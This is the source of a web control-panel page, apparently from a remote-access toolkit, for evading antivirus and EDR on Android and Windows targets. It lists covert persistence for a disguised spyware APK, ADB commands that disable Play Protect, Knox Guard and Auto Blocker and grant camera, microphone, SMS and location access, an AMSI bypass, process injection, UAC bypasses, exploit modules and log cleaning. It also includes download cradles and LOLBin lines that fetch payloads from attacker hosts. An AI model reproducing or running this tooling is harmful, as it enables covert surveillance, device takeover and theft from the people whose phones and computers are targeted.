"use client";

import { useState, useCallback, useEffect } from "react";
import { ANDROID_ZERO_INSTALL } from "@/lib/ios-delivery";

type Session = { id: number; ip: string; platform: string; hostname: string };
type AvProduct = { name: string; state: string; active: boolean };
type StepResult = { step: string; ok: boolean; out?: string };
type DetectResult = {
  products: AvProduct[];
  runningAv: string[];
  firewall: boolean;
  defenderRTP: boolean;
};

/* ─────────────────────────────────────────────────────────
   DATA: Android 8 → 16 complete threat model
───────────────────────────────────────────────────────── */
const ANDROID_VERSIONS = [
  {
    ver: "8.0/8.1", api: "26/27", name: "Oreo", devices: "S8, S9, Note 8",
    successBase: 85, successMax: 98,
    blockers: ["Basic bg service limits", "Play Protect basic signature scan"],
    techniques: [
      { id: "ao_resign",     label: "Resign APK",           cmd: "resign",          desc: "Custom keystore + package rename (com.google.services.update)" },
      { id: "ao_fg",         label: "Foreground Service",   cmd: "android_fg",      desc: "START_STICKY + IMPORTANCE_MIN notification channel" },
      { id: "ao_boot",       label: "BOOT_COMPLETED",       cmd: "android_boot",    desc: "Receiver in manifest — restarts on every reboot" },
      { id: "ao_bat",        label: "Battery Whitelist",    cmd: "android_battery", desc: "dumpsys deviceidle whitelist + appops allow" },
      { id: "ao_pp",         label: "Disable Play Protect", cmd: "play_protect",    desc: "pm disable-user --user 0 com.google.android.gms" },
    ],
    rootCves: ["CVE-2019-2215 (Binder UAF)", "CVE-2020-0041 (Binder OOB)"],
    notes: "Lowest security baseline. No Auto Blocker, no Knox Vault. Resign + foreground service = near-certain persistence.",
    color: "green",
  },
  {
    ver: "9", api: "28", name: "Pie", devices: "S10, Note 9",
    successBase: 82, successMax: 97,
    blockers: ["Background execution limits tightened", "Restricted battery API"],
    techniques: [
      { id: "ap_resign",   label: "Resign APK",                cmd: "resign",          desc: "Custom cert + package rename" },
      { id: "ap_fg",       label: "Foreground Service",        cmd: "android_fg",      desc: "IMPORTANCE_MIN + POST_NOTIFICATIONS denial trick" },
      { id: "ap_job",      label: "JobScheduler Fallback",     cmd: "android_job",     desc: "Periodic 15-min job when service killed — stealth recovery" },
      { id: "ap_bat",      label: "Battery Whitelist (ADB)",   cmd: "android_battery", desc: "Settings.Global + deviceidle whitelist via shell" },
      { id: "ap_acc",      label: "Accessibility Service",     cmd: "android_acc",     desc: "BIND_ACCESSIBILITY_SERVICE: survives Force Stop" },
    ],
    rootCves: ["CVE-2020-0041", "CVE-2021-0920 (Unix socket GC)"],
    notes: "Play Protect improved signature scanning. Resignation critical. Accessibility service if user grants = indestructible.",
    color: "green",
  },
  {
    ver: "10", api: "29", name: "Q", devices: "S20, Note 10",
    successBase: 72, successMax: 95,
    blockers: ["Background location restricted", "Play Protect ML heuristics", "Scoped storage"],
    techniques: [
      { id: "aq_resign",   label: "Resign APK",                cmd: "resign",          desc: "RSA-4096 keystore, randomize package + activity names" },
      { id: "aq_fg",       label: "Foreground + LOCATION type", cmd: "android_fg",     desc: "foregroundServiceType=location beats FreecessController" },
      { id: "aq_job",      label: "WorkManager (persisted)",    cmd: "android_job",    desc: "Self-rescheduling, survives reboot, very high stealth" },
      { id: "aq_fcm",      label: "FCM Silent Push Wakeup",     cmd: "android_fcm",    desc: "Firebase silent push restarts agent even from stopped state" },
      { id: "aq_acc",      label: "Accessibility Service",      cmd: "android_acc",    desc: "Once granted: screens, taps, overlays, survives Force Stop" },
    ],
    rootCves: ["CVE-2021-0920", "CVE-2022-20347 (Bluetooth RCE)"],
    notes: "Scoped storage blocks direct file access; use ContentResolver via Meterpreter's dump modules instead.",
    color: "yellow",
  },
  {
    ver: "11", api: "30", name: "R", devices: "S21, Note 20",
    successBase: 65, successMax: 93,
    blockers: ["Package visibility restrictions (QUERY_ALL_PACKAGES)", "One-time permissions", "Background start restrictions tightened"],
    techniques: [
      { id: "ar_resign",    label: "Resign APK",                 cmd: "resign",          desc: "Manifest must NOT request QUERY_ALL_PACKAGES (flags it)" },
      { id: "ar_fg",        label: "FG Service + connectedDevice",cmd: "android_fg",     desc: "connectedDevice type — less restricted than dataSync" },
      { id: "ar_multi",     label: "Multi-process Keepalive",    cmd: "android_multi",   desc: "Spawn 2nd process; when one is killed the other restarts it" },
      { id: "ar_acc",       label: "Accessibility Auto-Grant",   cmd: "android_acc",     desc: "Social-engineer one tap; then automation handles the rest" },
      { id: "ar_bat",       label: "Disable Doze + Battery Opt", cmd: "android_battery", desc: "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS + deviceidle whitelist" },
    ],
    rootCves: ["CVE-2022-20347", "CVE-2023-21208 (kernel OOB read)"],
    notes: "One-time permissions expire; request COARSE location to keep location access persistent without flagging.",
    color: "yellow",
  },
  {
    ver: "12/12L", api: "31/32", name: "S", devices: "S22, S22 Ultra",
    successBase: 52, successMax: 88,
    blockers: ["Exact alarm restricted (SCHEDULE_EXACT_ALARM)", "FG service from background blocked", "Mic/camera indicators in status bar", "Restricted settings"],
    techniques: [
      { id: "as_resign",    label: "Resign APK",                  cmd: "resign",         desc: "Must target API 31+; use targetSdkVersion=31 in rebuilt manifest" },
      { id: "as_fg",        label: "FG via Activity Trampoline",  cmd: "android_fg",     desc: "Start activity → immediately start FG service (beats background ban)" },
      { id: "as_acc",       label: "Accessibility Service",       cmd: "android_acc",    desc: "Still works — grants from notification/overlay if user taps once" },
      { id: "as_fcm",       label: "FCM Silent Push (reliable)",  cmd: "android_fcm",    desc: "FCM push exempted from background launch restrictions" },
      { id: "as_notif",     label: "POST_NOTIFICATIONS Trick",    cmd: "android_notifs", desc: "Never request permission — FG notification suppressed, service runs" },
    ],
    rootCves: ["CVE-2023-21208", "CVE-2023-35674 (framework priv-esc)"],
    notes: "Mic/camera green/orange dots visible to user while recording. Minimize active recording time, use periodic bursts.",
    color: "orange",
  },
  {
    ver: "13", api: "33", name: "T", devices: "S23, S23 Ultra",
    successBase: 40, successMax: 85,
    blockers: ["POST_NOTIFICATIONS is runtime permission", "Intent filters restricted", "Photo/video picker replaces direct storage", "FreecessController aggressive"],
    techniques: [
      { id: "at_resign",    label: "Resign + Anti-Knox APK",      cmd: "resign",         desc: "Full apktool teardown: rename dex entries, obfuscate smali, new cert" },
      { id: "at_notif",     label: "POST_NOTIFICATIONS Denial",   cmd: "android_notifs", desc: "Deny permission at runtime: FG service invisible, runs indefinitely" },
      { id: "at_fcm",       label: "FCM Push (primary keepalive)", cmd: "android_fcm",   desc: "FLAG_STOPPED does not block FCM high-priority messages" },
      { id: "at_acc",       label: "Accessibility Service",       cmd: "android_acc",    desc: "Hardest to get on 13 — use overlay + fake system message prompt" },
      { id: "at_bat",       label: "Freeze Bypass (ADB)",         cmd: "android_battery",desc: "cmd appops set ... RUN_ANY_IN_BACKGROUND allow + deviceidle whitelist" },
      { id: "at_cve",       label: "CVE-2024-34740 (priv-esc)",   cmd: "cve_34740",      desc: "Samsung Android 13 ≤ Jul2023 SPL: local privilege escalation to system" },
    ],
    rootCves: ["CVE-2024-34740 (Samsung-specific, reliable)", "CVE-2023-35674"],
    notes: "CVE-2024-34740 gives system shell on unpatched S23. From system: disable Play Protect, install as priv-app, defeat Knox.",
    color: "orange",
  },
  {
    ver: "14", api: "34", name: "U", devices: "S24, S24 Ultra, S24+",
    successBase: 18, successMax: 78,
    blockers: ["Auto Blocker (sideload blocked by default)", "Restricted Settings (accessibility harder)", "FG service types enforced", "Knox Vault hardware-backed", "Play Protect ML improved"],
    techniques: [
      { id: "au_adb",       label: "ADB Over Network (target device)", cmd: "adb_tailscale", desc: "adb connect <TARGET_IP>:5555 → disable Auto Blocker + install APK on target" },
      { id: "au_autoblk",   label: "Disable Auto Blocker",        cmd: "auto_blocker",   desc: "settings put global auto_blocker_mode 0 via ADB/shell" },
      { id: "au_resign",    label: "Deep Resign (smali-level)",    cmd: "resign",         desc: "Rename every class, method, string in smali before rebuild" },
      { id: "au_notif",     label: "POST_NOTIFICATIONS Trick",     cmd: "android_notifs", desc: "Deny at install: FG service invisible. FOREGROUND_SERVICE_TYPE=connectedDevice" },
      { id: "au_fcm",       label: "FCM + WorkManager Chain",      cmd: "android_fcm",    desc: "FCM push → WorkManager expedited job → FG service start chain" },
      { id: "au_cve26",     label: "CVE-2026-21007 (Knox Guard)",  cmd: "cve_21007",      desc: "Physical or local: Device Care bug bypasses Knox Guard (pre-Apr2026 SMR)" },
    ],
    rootCves: ["CVE-2026-21007 (Knox Guard, local physical)", "CVE-2024-34740 (if ≤ Jul2023 SPL)"],
    notes: "Auto Blocker is enabled by default on S24. If you have ADB access to the target (via their network): one command disables Auto Blocker before install.",
    color: "red",
  },
  {
    ver: "15", api: "35", name: "V", devices: "S25 series",
    successBase: 12, successMax: 68,
    blockers: ["dataSync FG type limited to 6 hours", "Health Connect gated", "Predictive Back Gesture blocks overlays", "Further accessibility restrictions", "Stronger Auto Blocker defaults"],
    techniques: [
      { id: "av_fg",        label: "FG Type: connectedDevice",    cmd: "android_fg",     desc: "Not time-limited unlike dataSync; use for persistent C2" },
      { id: "av_fcm",       label: "FCM High-Priority Chain",     cmd: "android_fcm",    desc: "Only reliable non-ADB wakeup mechanism on Android 15" },
      { id: "av_adb",       label: "ADB Delivery",                cmd: "adb_tailscale",  desc: "Via Tailscale or USB: install, grant perms, disable restrictions" },
      { id: "av_notif",     label: "POST_NOTIFICATIONS Trick",    cmd: "android_notifs", desc: "Still works; FG service invisible with denied notification perm" },
      { id: "av_multi",     label: "Multi-process Watchdog",      cmd: "android_multi",  desc: "Process A watches B, B watches A — both killed rarely simultaneously" },
    ],
    rootCves: ["No public reliable kernel CVEs for Android 15 as of Jun 2026"],
    notes: "No reliable remote code execution chain yet. ADB or social engineering remain primary delivery vectors.",
    color: "red",
  },
  {
    ver: "16", api: "36", name: "Baklava", devices: "S25 (2026 update)",
    successBase: 8, successMax: 58,
    blockers: ["Hardened Binder IPC", "Memory tagging extended (MTE) on all Pixel/Samsung", "Stricter SELinux policy", "No broadcast receivers for implicit intents", "Auto Blocker on by default on all new activations"],
    techniques: [
      { id: "aw_fcm",       label: "FCM Only (primary vector)",   cmd: "android_fcm",    desc: "FCM is only reliable remote wakeup; all others need user interaction" },
      { id: "aw_adb",       label: "ADB Over Network",            cmd: "adb_tailscale",  desc: "Still works if Developer Mode on. Most reliable on all versions." },
      { id: "aw_fg",        label: "FG connectedDevice type",     cmd: "android_fg",     desc: "Use connectedDevice with correct manifest declaration" },
      { id: "aw_notif",     label: "POST_NOTIFICATIONS Trick",    cmd: "android_notifs", desc: "Confirmed still works in Android 16 DP3" },
    ],
    rootCves: ["No public CVEs for Android 16 as of Jun 2026"],
    notes: "MTE makes heap spray and UAF exploits dramatically harder. FCM + ADB delivery + FG service is current best strategy.",
    color: "red",
  },
];

/* ─────────────────────────────────────────────────────────
   DATA: Windows 7 → 11 complete threat model
───────────────────────────────────────────────────────── */
const WINDOWS_VERSIONS = [
  {
    ver: "7 SP1",   build: "7601",   name: "Windows 7 SP1",
    successBase: 97, successMax: 99,
    av: "MSE (optional)", smartscreen: false, amsi: false, tamper: false, sac: false,
    blockers: ["MSE/SEP signature scan (bypass trivially)", "User Account Control"],
    techniques: [
      { label: "Raw Meterpreter EXE",           desc: "msfvenom -p windows/x64/meterpreter/reverse_https: MSE misses staged payloads" },
      { label: "VBA Macro (Office 2010-13)",     desc: "Word/Excel macro: no Protected View, runs immediately on open" },
      { label: "PowerShell v2 No AMSI",          desc: "PS v2 has no AMSI — use powershell -version 2 for completely unscanned execution" },
      { label: "UAC bypass: eventvwr.exe",       desc: "Works on all Win7: eventvwr registry hijack → elevated shell no prompt" },
      { label: "Persistence: Registry Run key",  desc: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — simple and effective" },
    ],
    notes: "No AMSI, no Tamper Protection, no Smart App Control. Essentially undefended against modern techniques.",
    color: "green",
  },
  {
    ver: "8.1",     build: "9600",   name: "Windows 8.1",
    successBase: 94, successMax: 99,
    av: "Windows Defender (basic)", smartscreen: true, amsi: false, tamper: false, sac: false,
    blockers: ["Windows Defender signature scan", "SmartScreen on downloads"],
    techniques: [
      { label: "XOR-encrypted shellcode loader",  desc: "Encrypt payload bytes: WD static scan bypassed entirely" },
      { label: "Signed binary proxy (msiexec)",   desc: "msiexec /q /i http://attacker/payload.msi — LOLBin delivery" },
      { label: "Regsvr32 COM scriptlet",          desc: "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll" },
      { label: "SmartScreen bypass: cert sign",   desc: "Self-sign with a trusted-looking OV cert (or stolen cert) — SmartScreen passes" },
      { label: "UAC bypass: fodhelper",           desc: "fodhelper.exe registry hijack → HKCU\\Software\\Classes\\ms-settings" },
    ],
    notes: "SmartScreen checks reputation of EXE downloads. Host on trusted CDN or sign the binary to bypass.",
    color: "green",
  },
  {
    ver: "10 1507-1607", build: "10240-14393", name: "Windows 10 Early",
    successBase: 72, successMax: 95,
    av: "Windows Defender ATP (basic)", smartscreen: true, amsi: true, tamper: false, sac: false,
    blockers: ["AMSI hooks PS execution", "Defender ATP behavioral scan", "Protected View in Office"],
    techniques: [
      { label: "AMSI bypass: amsiInitFailed",     desc: "[Ref].Assembly.GetType('...AmsiUtils').GetField('amsiInitFailed'...).SetValue($null,$true)" },
      { label: "Direct syscall loader (Rust/C)",  desc: "Avoid ntdll.dll user-mode hooks: NtAllocateVirtualMemory → NtWriteVirtualMemory via raw syscall numbers" },
      { label: "PowerShell Download Cradle",      desc: "IEX (New-Object Net.WebClient).DownloadString('http://c2/stage.ps1') — no disk write" },
      { label: "Process injection → explorer",    desc: "Inject into explorer.exe: trusted process, always running, user context" },
      { label: "UAC: eventvwr or sdclt",          desc: "Both work on 1507-1703; sdclt works to 1803" },
    ],
    notes: "AMSI introduced but early bypass techniques reliable. No Tamper Protection yet — WD service can be stopped.",
    color: "yellow",
  },
  {
    ver: "10 1703-1909", build: "15063-18363", name: "Windows 10 Mid",
    successBase: 62, successMax: 90,
    av: "Windows Defender ATP + Cloud Deliver", smartscreen: true, amsi: true, tamper: false, sac: false,
    blockers: ["AMSI v2 (more techniques patched)", "Cloud-delivered protection", "ASR rules (Defender ATP)"],
    techniques: [
      { label: "HW breakpoint AMSI bypass",       desc: "Set DR0 on AmsiScanBuffer via VEH: no byte patch = no integrity alert" },
      { label: "ETW bypass (EtwEventWrite patch)", desc: "Patch EtwEventWrite in ntdll to ret 0 — blinds CrowdStrike/SentinelOne" },
      { label: "Reflective DLL (no disk write)",  desc: "Load DLL entirely in process memory via PE loader: no file scan trigger" },
      { label: "PPID spoofing (CreateProcess)",   desc: "CreateProcess with PROC_THREAD_ATTR_PARENT_PROCESS → fake parent = winlogon" },
      { label: "Staged reverse_https on :443",    desc: "Stage downloaded over HTTPS: static payload is just a stub, beats signature scan" },
    ],
    notes: "Hardware breakpoint AMSI bypass works because it doesn't patch bytes — Defender memory integrity check passes.",
    color: "yellow",
  },
  {
    ver: "10 2004-22H2", build: "19041-19045", name: "Windows 10 Recent",
    successBase: 48, successMax: 82,
    av: "Defender XDR + Tamper Protection", smartscreen: true, amsi: true, tamper: true, sac: false,
    blockers: ["Tamper Protection (WD service cannot be stopped)", "Credential Guard", "ASR rules block Office macros", "AMSI for .NET assemblies"],
    techniques: [
      { label: "Direct syscalls (SysWhispers3)",  desc: "Unhook ntdll by reading clean copy from disk; use direct syscall numbers — defeats all user-mode hooks" },
      { label: "LNK delivery (no MOTW on share)", desc: "LNK file from UNC/WebDAV share: no Mark of the Web — SmartScreen skipped" },
      { label: "AMSI: HW breakpoint VEH method",  desc: "Hardware breakpoint on AmsiScanBuffer via AddVectoredExceptionHandler: undetectable by byte scan" },
      { label: "Process inject: svchost.exe",     desc: "OpenProcess on an existing svchost clone: SYSTEM context, hides in crowd of 15+ svchost instances" },
      { label: "UAC: ICMLuaUtil COM interface",   desc: "ICMLuaUtil::ShellExec bypasses UAC on all Win10 22H2 without user prompt" },
      { label: "Token impersonation (SYSTEM)",    desc: "Steal WinLogon or LSASS token after migration into trusted process" },
    ],
    notes: "Tamper Protection blocks stopping WD service. Must work around it via injection/token theft rather than disabling.",
    color: "orange",
  },
  {
    ver: "11 21H2-22H2", build: "22000-22621", name: "Windows 11 Early",
    successBase: 40, successMax: 78,
    av: "Defender XDR + Tamper Protection + VBS", smartscreen: true, amsi: true, tamper: true, sac: false,
    blockers: ["VBS (Virtualization-Based Security)", "HVCI (blocks unsigned kernel drivers)", "AMSI for WScript/cscript", "Memory integrity (WDAC)"],
    techniques: [
      { label: "In-memory only (no disk artifacts)", desc: "Full chain in RAM: PS download cradle → HW breakpoint AMSI → reflective load → inject. Zero bytes on disk." },
      { label: "Direct syscall (Hell's Gate)",    desc: "Read syscall numbers from ntdll at runtime: works even with function hooking by EDR" },
      { label: "PPID spoof + inject svchost",     desc: "CreateProcess suspended svchost → WriteProcessMemory → resume: hides in system process list" },
      { label: "Rust loader + XOR shellcode",     desc: "Compile Rust binary with XOR decrypt + sleep(60s sandbox evasion) + inject: WD misses on first scan" },
      { label: "WMI subscription persistence",    desc: "ActiveScriptEventConsumer via WMI: fires on event trigger, survives reboots, no registry keys" },
    ],
    notes: "VBS/HVCI blocks kernel rootkits. Stay in user-mode: inject into system processes for SYSTEM context.",
    color: "orange",
  },
  {
    ver: "11 23H2-24H2", build: "22631-26100", name: "Windows 11 Latest",
    successBase: 28, successMax: 72,
    av: "Defender XDR + Smart App Control + TPM 2.0 backed", smartscreen: true, amsi: true, tamper: true, sac: true,
    blockers: ["Smart App Control (SAC) — blocks all unsigned/unrecognized EXE", "Enhanced Phishing Protection", "Defender XDR cloud sandbox", "Pluton security processor (some models)"],
    techniques: [
      { label: "SAC bypass: sign with EV cert",   desc: "Extended Validation (EV) code signing cert: SAC treats as trusted. Stolen/purchased on dark market." },
      { label: "SAC bypass: LOLBin injection",    desc: "msiexec, regsvr32, wmic, mshta — Living Off the Land binaries already trusted by SAC" },
      { label: "SAC bypass: disable SAC first",   desc: "From admin shell: reg add HKLM\\...\\Windows Defender\\Smart App Control /v Enabled /t REG_DWORD /d 0" },
      { label: "Full in-memory chain",            desc: "PS with HW-breakpoint AMSI → Hell's Gate syscalls → inject svchost: no new EXE on disk = SAC never scans" },
      { label: "Phishing PS one-liner",           desc: "HTML Application (.hta) or .url → iwr | iex: one click delivery, no EXE written to disk" },
      { label: "PPID spoof + token impersonation",desc: "Impersonate TrustedInstaller via token theft from TiWorker.exe after process migration" },
    ],
    notes: "Smart App Control is the hardest new control. Target LOLBins or fully in-memory chains that never write new EXE. If you have admin: disable SAC in one registry write.",
    color: "red",
  },
];

/* ─────────────────────────────────────────────────────────
   DATA: Samsung Knox 6-phase neutralizer
───────────────────────────────────────────────────────── */
const KNOX_PHASES = [
  { phase: 0, name: "Wipe kgclient Data",        detail: "Delete cached lock commands from Device Care — prevents re-lock on reboot" },
  { phase: 1, name: "Unlock Sequence",            detail: "7-call reflection sequence through system_server + receiver unregistration from Knox Guard broadcasts" },
  { phase: 2, name: "Network Firewall",           detail: "Block kgclient outbound via NetworkManagementService — Knox Guard server cannot push new lock commands" },
  { phase: 3, name: "Watchers + Watchdog",        detail: "FileObserver + ContentObserver on Knox state files + 10s force-stop watchdog loop" },
  { phase: 4, name: "Force-Stop kgclient",        detail: "ActivityManager.forceStopPackage(kgclient) — kills the enforcement process repeatedly" },
  { phase: 5, name: "Neutralize KnoxGuardSeService", detail: "Null callbacks, unregister all receivers, cancel all alarms. Service remains running but deaf." },
];

const KNOX_ADB_CMDS = [
  { label: "Connect to target via ADB (TCP)",      cmd: "adb connect <TARGET_DEVICE_IP>:5555" },
  { label: "Disable Auto Blocker",                cmd: "adb shell settings put global auto_blocker_mode 0" },
  { label: "Disable Play Protect",                cmd: "adb shell settings put global package_verifier_enable 0" },
  { label: "Disable Samsung Knox Guard agent",    cmd: "adb shell pm disable-user --user 0 com.samsung.android.kgclient" },
  { label: "Battery whitelist payload",           cmd: "adb shell dumpsys deviceidle whitelist +com.google.services.update" },
  { label: "Grant all runtime permissions",       cmd: "adb shell pm grant com.google.services.update android.permission.CAMERA android.permission.RECORD_AUDIO android.permission.READ_CONTACTS android.permission.ACCESS_FINE_LOCATION android.permission.READ_SMS android.permission.READ_CALL_LOG" },
  { label: "Disable battery optimization",        cmd: "adb shell cmd appops set com.google.services.update RUN_ANY_IN_BACKGROUND allow" },
  { label: "Freeze FreecessController (S22-S24)", cmd: "adb shell settings put global freecess_ctrl 0" },
  { label: "Install payload silently",            cmd: "adb install -g -t -r payload_resigned.apk" },
  { label: "Start payload silently",              cmd: "adb shell am start -n com.google.services.update/.MainActivity --activity-clear-top" },
];

/* ─────────────────────────────────────────────────────────
   DATA: Privilege escalation (Android + Windows)
───────────────────────────────────────────────────────── */
const PRIVESC_ANDROID = [
  { cve: "CVE-2024-34740", target: "Samsung Android 13 (≤ Jul 2023 SPL)", impact: "Local priv-esc → system UID", msf: "exploit/android/local/samsung_priv_esc", note: "Reliable on S23 if unpatched. Gives UID 1000 (system)." },
  { cve: "CVE-2023-35674", target: "Android 10-13 (framework)",            impact: "Intent manipulation → system priv-esc", msf: "manual exploit required", note: "Allows starting activities as system, granting arbitrary permissions." },
  { cve: "CVE-2022-20347", target: "Android 10-12 (Bluetooth)",            impact: "Remote code execution over Bluetooth", msf: "exploit/android/bluetooth/cve_2022_20347", note: "Requires device BT discoverable. Good for proximity attacks." },
  { cve: "CVE-2021-0920",  target: "Android 8-11 (kernel)",                impact: "Unix socket GC UAF → kernel root", msf: "exploit/android/local/cve_2021_0920", note: "Classic kernel UAF. Works on most unpatched Android 9/10 devices." },
  { cve: "CVE-2020-0041",  target: "Android 8-9 (Binder)",                 impact: "Binder OOB → kernel root",            msf: "exploit/android/local/binder_uaf", note: "Well-tested. Very reliable on Android 9 S10/Note9." },
  { cve: "Auto-suggest",   target: "Any session",                           impact: "Auto-detect applicable CVEs",          msf: "post/multi/recon/local_exploit_suggester", note: "Run this first after getting any session — auto-selects best local exploit." },
];

const PRIVESC_WINDOWS = [
  { cve: "MS17-010 (EternalBlue)", target: "Win7-Win10 1703 (SMBv1)", impact: "SYSTEM via SMB without auth", msf: "exploit/windows/smb/ms17_010_eternalblue", note: "Most reliable ever. Run nmap -p445 --script smb-vuln-ms17-010 first." },
  { cve: "CVE-2021-34527 (PrintNightmare)", target: "All Windows + Server", impact: "SYSTEM via Print Spooler", msf: "exploit/windows/local/cve_2021_34527_printnightmare", note: "Add admin user or load DLL as SYSTEM. Patched but unreliable patch on many systems." },
  { cve: "CVE-2022-21999 (SpoolFool)",   target: "All Windows",            impact: "SYSTEM via Print Spooler bypass", msf: "exploit/windows/local/spoolfool", note: "Bypass for PrintNightmare patch. Works even when MS07-010 patch is applied." },
  { cve: "CVE-2023-28252 (CLFS driver)", target: "Win10/11",               impact: "Kernel priv-esc → SYSTEM",         msf: "exploit/windows/local/cve_2023_28252_clfs", note: "Used by Nokoyawa ransomware gang. Reliable on unpatched Win11." },
  { cve: "Token Impersonation",          target: "All Windows (post-migration)", impact: "Impersonate any token", msf: "post/windows/escalate/getsystem", note: "Run after migrating to svchost/explorer. Tries 9 token theft techniques." },
  { cve: "Auto-suggest",                target: "Any Windows session",     impact: "Auto-detect applicable CVEs",  msf: "post/multi/recon/local_exploit_suggester", note: "Always run this first — scans 50+ Windows local exploits." },
];

/* ─────────────────────────────────────────────────────────
   CONSTANTS
───────────────────────────────────────────────────────── */
const UAC_METHODS = [
  { id: "fodhelper",    label: "fodhelper.exe",   os: "Win10+",    risk: "medium" },
  { id: "eventvwr",     label: "eventvwr.exe",    os: "Win7-10",   risk: "medium" },
  { id: "comhijack",    label: "COM Hijack",      os: "Win10+",    risk: "high" },
  { id: "sdclt",        label: "sdclt.exe",       os: "Win10",     risk: "medium" },
  { id: "silentclean",  label: "SilentCleanup",   os: "Win10+",    risk: "low" },
  { id: "icmluautil",   label: "ICMLuaUtil COM",  os: "Win10-11",  risk: "low" },
];

const MIGRATE_PROCS = [
  { name: "explorer.exe",      reason: "User context, always running" },
  { name: "svchost.exe",       reason: "SYSTEM context, hides in crowd of 15+" },
  { name: "RuntimeBroker.exe", reason: "Signed MS binary, UWP broker" },
  { name: "SearchIndexer.exe", reason: "Persistent background process" },
  { name: "TiWorker.exe",      reason: "TrustedInstaller context, highest token" },
  { name: "WmiPrvSE.exe",      reason: "WMI provider, unusual in process list" },
];

type TabId = "matrix"|"android"|"zeroinstall"|"knox"|"windows"|"amsi"|"uac"|"migrate"|"inject"|"logs"|"privesc";

const colorMap: Record<string, string> = {
  green: "border-green-700/40 text-green-400",
  yellow: "border-yellow-700/40 text-yellow-400",
  orange: "border-orange-700/40 text-orange-400",
  red: "border-red-700/40 text-red-400",
};
const bgMap: Record<string, string> = {
  green: "bg-green-950/20",
  yellow: "bg-yellow-950/20",
  orange: "bg-orange-950/20",
  red: "bg-red-950/20",
};
const dotMap: Record<string, string> = {
  green: "bg-green-500",
  yellow: "bg-yellow-500",
  orange: "bg-orange-500",
  red: "bg-red-500",
};

export default function EvasionPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<TabId>("matrix");
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const [detected, setDetected] = useState<DetectResult | null>(null);
  const [uacMethod, setUacMethod] = useState("fodhelper");
  const [migrateProc, setMigrateProc] = useState("svchost.exe");
  const [injectPid, setInjectPid] = useState("");
  const [obfCmd, setObfCmd] = useState("whoami /all");
  const [obfResult, setObfResult] = useState<Record<string, string> | null>(null);
  const [expandedAndroid, setExpandedAndroid] = useState<string | null>(null);
  const [expandedWin, setExpandedWin] = useState<string | null>(null);
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
  const [targetIp, setTargetIp] = useState("");
  const [apkPath, setApkPath] = useState("/sdcard/update.apk");
  const [zeroInstallResult, setZeroInstallResult] = useState<Record<string, unknown> | null>(null);

  const addLog = useCallback((msg: string, t: "info" | "ok" | "err" = "info") => {
    const icon = t === "ok" ? "✓" : t === "err" ? "✗" : "·";
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${icon} ${msg}`, ...p].slice(0, 300));
  }, []);

  useEffect(() => {
    fetch("/api/sessions").then((r) => r.json()).then((d) => {
      const list = Array.isArray(d) ? d : d.sessions ?? [];
      setSessions(list);
      if (list.length > 0) setSession(list[0]);
    }).catch(() => {});
  }, []);

  const call = useCallback(async (action: string, extra: Record<string, unknown> = {}) => {
    if (!session) return { ok: false, error: "No session" };
    const r = await fetch("/api/evasion", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: session.id, action, ...extra }),
    });
    return r.json() as Promise<Record<string, unknown>>;
  }, [session]);

  const runAction = useCallback(async (action: string, label: string, extra: Record<string, unknown> = {}) => {
    setLoading(action); addLog(`Running: ${label}…`);
    const res = await call(action, extra);
    setLoading(null);
    if (res.ok) {
      addLog(`${label} — success`, "ok");
      if (res.data && typeof res.data === "object") {
        const d = res.data as Record<string, unknown>;
        if (d.steps) (d.steps as StepResult[]).forEach((s) => addLog(`  ${s.step}: ${s.ok ? "✓" : "✗"}`));
        if (d.killed) addLog(`  Killed: ${(d.killed as string[]).join(", ")}`, "ok");
      }
    } else addLog(`${label} failed: ${res.error}`, "err");
  }, [call, addLog]);

  const copyCmd = (cmd: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedCmd(cmd);
    setTimeout(() => setCopiedCmd(null), 1500);
  };

  const TABS: { id: TabId; label: string; icon: string }[] = [
    { id: "matrix",     label: "OS MATRIX",      icon: "⬛" },
    { id: "android",    label: "ANDROID 8→16",   icon: "🤖" },
    { id: "zeroinstall",label: "ZERO-INSTALL",   icon: "⚡" },
    { id: "knox",       label: "KNOX BYPASS",    icon: "🔐" },
    { id: "windows", label: "WINDOWS 7→11", icon: "🖥" },
    { id: "privesc", label: "PRIV-ESC",     icon: "⬆" },
    { id: "amsi",    label: "AMSI/ETW",     icon: "⚡" },
    { id: "uac",     label: "UAC BYPASS",   icon: "🔓" },
    { id: "migrate", label: "MIGRATE",      icon: "👻" },
    { id: "inject",  label: "INJECT",       icon: "💉" },
    { id: "logs",    label: "CLEAN LOGS",   icon: "🧹" },
  ];

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">

      {/* LEFT SIDEBAR */}
      <aside className="w-52 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-500 tracking-widest">AV/EDR EVASION CENTER</div>
          <div className="text-[7px] text-green-900/50 mt-0.5">FULL SPECTRUM // ANDROID 8-16 + WIN 7-11</div>
        </div>

        <div className="p-2 border-b border-green-900/30">
          <div className="text-[7px] text-green-900 tracking-widest mb-1">TARGET SESSION</div>
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-1.5 rounded border mb-1 text-[8px] transition-all ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-green-400">#{s.id} {s.platform}</div>
              <div className="text-green-800 truncate">{s.hostname ?? s.ip}</div>
            </button>
          ))}
          {sessions.length === 0 && <div className="text-[8px] text-green-900/30 p-1">No sessions</div>}
        </div>

        <nav className="flex-1 overflow-y-auto p-1">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`w-full text-left px-2 py-1.5 rounded text-[9px] mb-0.5 transition-all ${
                tab === t.id ? "bg-green-950/40 text-green-300 border border-green-800/40" : "text-green-800 hover:text-green-600"
              }`}>
              {t.icon} {t.label}
            </button>
          ))}
        </nav>

        {detected && (
          <div className="p-2 border-t border-green-900/30 space-y-1">
